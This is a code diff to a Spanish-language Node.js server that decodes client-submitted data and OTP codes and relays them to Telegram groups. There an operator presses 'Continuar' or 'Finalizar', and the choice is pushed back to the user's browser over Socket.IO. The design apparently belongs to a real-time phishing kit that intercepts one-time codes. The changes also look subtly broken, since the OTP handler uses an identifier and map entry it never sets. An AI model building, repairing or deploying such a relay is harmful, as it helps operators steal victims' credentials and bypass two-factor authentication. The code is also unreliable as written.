@@ -8,6 +8,7 @@ import {
 
 let ioInstance;
 const activeSessions = new Map();
+const decisionMap = new Map();
 
 export const setSocketIO = (io) => {
   ioInstance = io;
@@ -21,6 +22,7 @@ export const initProcess = async (req, res) => {
     const groupId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
     const decrypted = JSON.parse(atob(data));
     const decisionId = `${socketId}-${Date.now()}`;
+    decisionMap.set(decisionId, socketId);
 
     const session = {
       chatId: groupId,
@@ -45,16 +47,22 @@ export const initProcess = async (req, res) => {
     });
 
     if (!message_id) {
-      return res.status(500).json({ success: false, message: "No se pudo enviar el mensaje a Telegram" });
+      return res.status(500).json({
+        success: false,
+        message: "No se pudo enviar el mensaje a Telegram",
+      });
     }
 
     session.messageId = String(message_id);
 
     waitForDecision(decisionId)
       .then((decision) => {
-        if (ioInstance) {
-          ioInstance.to(session.socketId).emit("decision", decision);
+        const socketId = decisionMap.get(decisionId);
+        const session = activeSessions.get(socketId);
+        if (session && ioInstance) {
+          ioInstance.to(socketId).emit("decision", decision);
         }
+        decisionMap.delete(decisionId); // Limpieza
       })
       .catch((err) => {
         console.error("Timeout esperando decisión:", err.message);
@@ -142,21 +150,32 @@ export const updateMessageWithOtp = async (req, res) => {
       messageId: session.messageId,
       text: messageText,
       reply_markup: {
-        inline_keyboard: [[
-          { text: "Continuar", callback_data: `continue:${session.decisionId}` },
-          { text: "Finalizar", callback_data: `finalize:${session.decisionId}` },
-        ]],
+        inline_keyboard: [
+          [
+            {
+              text: "Continuar",
+              callback_data: `continue:${session.decisionId}`,
+            },
+            {
+              text: "Finalizar",
+              callback_data: `finalize:${session.decisionId}`,
+            },
+          ],
+        ],
       },
     });
 
-    waitForDecision(session.decisionId)
+    waitForDecision(decisionId)
       .then((decision) => {
-        if (ioInstance) {
-          ioInstance.to(session.socketId).emit("final-decision", decision);
+        const socketId = decisionMap.get(decisionId);
+        const session = activeSessions.get(socketId);
+        if (session && ioInstance) {
+          ioInstance.to(socketId).emit("decision", decision);
         }
+        decisionMap.delete(decisionId); // Limpieza
       })
       .catch((err) => {
-        console.error("Timeout esperando decisión del OTP:", err.message);
+        console.error("Timeout esperando decisión:", err.message);
       });
 
     return res.status(200).json({ success: true });
